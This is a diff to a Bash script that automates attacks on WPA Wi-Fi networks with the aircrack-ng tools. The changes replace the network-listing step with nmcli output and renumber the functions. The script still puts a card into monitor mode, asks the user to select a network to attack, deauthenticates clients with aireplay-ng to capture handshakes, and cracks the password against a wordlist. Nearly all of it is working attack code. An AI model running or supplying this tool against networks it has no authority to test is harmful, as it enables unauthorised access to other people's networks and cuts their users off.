@@ -11,11 +11,6 @@ deauthtime=999
 mkdir -p handshakes
 mkdir -p passwords
 
-# Simple usage of airodump just to see all hosts
-function airodumpall {
-	xterm -title "FIND YOUR TARGET" $CENTER -e airodump-ng -a --encrypt WPA $nic -w target -o kismet
-}
-
 # This function capture the specific network data
 function airodumpscanclients {
 	xterm -title "SCANNING $networkname NETWORK " $TOPRIGHTBIG -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name --output-format csv,cap $nic &
@@ -187,7 +182,7 @@ function MONMOD {
 
 # User select the real nic to be used
 
-	read -e -p $'\x0a# Select the network card you want to use [enter for wlan0]: ' nicreal
+	read -e -p $'\x0a# 1) Select the network card you want to use [enter for wlan0]: ' nicreal
 	
 	if [ -z "$nicreal" ] ; then
 		nicreal=wlan0
@@ -197,90 +192,46 @@ function MONMOD {
 		read -e -p $'\x0a# Sorry, this network card don\'t exist, try again: ' nicreal
 	done
 
-	# Kill all process the could couse trouble to aircrack family
-	
-		airmon-ng check kill &> /dev/null &
 
 	
 # Check if exist the mon0 nic, else, create and activate
 
 	if `iw dev | grep -q $nic`; then
 		ifconfig mon0 up 2> /dev/null
-		GERTAB
 	else
 		iw dev $nicreal interface add $nic type monitor 2> /dev/null
 		ifconfig mon0 up 2> /dev/null
-		GERTAB
 	fi
-
-}
-
-##################################################
-# 2) Generate table with all WPA networks found. #
-
-function GERTAB {
-
-	echo -e "\n# 1) When you find the target network, press CTRL+C.  #"
-	airodumpall
-	name=target
 
 }
 
 #######################################################################
-# 3) Edit airodump output in a human readable way and choose network. #
+# 2) Get data bout network AP's and ask user about wich attack. #
 
 function EDTCHN {
 
-	if [ ! -f $name-01.kismet.csv ]; then
-		echo -e "\n# File not found, rescaning... #"
-		rm -rf $name*.kismet.csv
-		airodumpall
-	fi
 
-### Output edit ###
+# Informations about NetworkManager
 
-# Generate base file
-
-cat target-01.kismet.csv | cut -d ';' -f4,6,22 | sed 's/;/ /g' | sed 's/BestQuality/-dB/g' | column -t > auxfile0
-
-# Generate names
-
-cat target-01.kismet.csv | cut -d ';' -f3 > auxfile1
-
-# Paste and sort
-
-paste -d " " auxfile0 /dev/null auxfile1 | sort -k3 -n -r > auxfile2
-
-# Generate body
-
-tail -n +2 auxfile2 | nl | sed -e 's/^[ \t]*//' > auxfile3
-
-# Generate banner
-
-head -n 1 auxfile2 | sed -e 's/^/Network /' > auxfile4
-
-# Merge body + banner and finish storing in a file
-
-cat auxfile4 auxfile3 > auxfile5
-
-### End ###
+	nmcli -f BSSID,CHAN,SIGNAL,SECURITY,SSID dev wifi list > netdata
 
 # Choose network
 
 	echo -e "\n--------------------------------------------------------------"
-	cat auxfile5
+	nl -v0 netdata | sed 's/^[ \t]*//'
 	echo -e "^-------------------------------------------------------------\n"
 	read -e -p "# 2) Select the network you want to attack [1,2,3...N]: " num
+	
+	if [[ $num -eq 0 ]]; then echo "Invalid option, try again"; sleep 2 ; EDTCHN ; fi
 	let num=num+1
 
 # Based on users option, get the host: mac, channel and name
 
-	bssidtarget=$(cat auxfile5 | awk -v aux=$num 'NR==aux {print $2}')
-	channel=$(cat auxfile5 | awk -v aux=$num 'NR==aux {print $3}')
-	networkname=$(cat auxfile5 | awk -v aux=$num 'NR==aux {print $5 $6 $7 $8}')
-	rm -rf auxfile*
-	rm -rf $name-01.kismet.csv
+	bssidtarget=$(cat netdata | awk -v aux=$num 'NR==aux {print $1}')
+	channel=$(cat netdata | awk -v aux=$num 'NR==aux {print $2}')
+	networkname=$(cat netdata | awk -v aux=$num 'NR==aux {print $7 $8 $9 $10}')
 	name=$networkname"_"$bssidtarget
+	rm -rf netdata
 
 # If it found a useful handshake, advance some steps
 
@@ -289,14 +240,18 @@ cat auxfile4 auxfile3 > auxfile5
 		realpath $name-hanshake.cap
 		read -e -p $'\x0a# Use it? [y/n]: ' opt
 			if [ $opt = "y" ] || [ $opt = "Y" ]; then
-				WORDLIST
+				WORLST
 			fi	
 	fi
+
+# Kill all process the could couse trouble to aircrack family
+	
+	airmon-ng check kill &> /dev/null &
 
 }
 
 #############################################
-# 4) Scan especific network to get clients. #
+# 3) Scan especific network to get clients. #
 
 function ESPSCN {
 
@@ -316,7 +271,7 @@ function ESPSCN {
 }
 
 ########################################
-# 5) Attack network using aireplay-ng. #
+# 4) Attack network using aireplay-ng. #
 
 function ATTAIR {
 
@@ -351,7 +306,7 @@ function ATTAIR {
 }
 
 #################################################
-# 6) Search wordlist and verify if don't exist. #
+# 5) Search wordlist and verify if don't exist. #
 
 function WORLST {
 
@@ -371,7 +326,7 @@ function WORLST {
 }
 
 ##################################
-# 7) Decryptograph the password. #
+# 6) Decryptograph the password. #
 
 function ACRACK {
 
@@ -397,7 +352,7 @@ function ACRACK {
 		clear
 		read -e -p $'\x0a# Sad news but... This wordlist haven\'t the password =/... Try again with a new one? [y/n]: ' opt
 		if [ "$opt" = "y" ] || [ "$opt" = "Y" ]; then
-			WORDLIST
+			WORLST
 		else
 			END
 		fi			
@@ -410,7 +365,7 @@ function ACRACK {
 }
 
 ################################################################
-# 8) Reinicialize network services and delete the nic created. #
+# 7) Reinicialize network services and delete the nic created. #
 
 function END {
 
@@ -431,7 +386,6 @@ function END {
 	rm -rf $name-01.cap &>/dev/null
 	rm -rf $name.lst &>/dev/null
 	rm -rf target-0* &>/dev/null
-	rm -rf auxfile* &>/dev/null
 	rm -rf $name-passwd.txt &>/dev/null
 	sleep $st
 
@@ -468,7 +422,6 @@ MAIN() {
 	SETRES
 	INTROD
 	MONMOD
-	GERTAB
 	EDTCHN
 	ESPSCN
 	ATTAIR
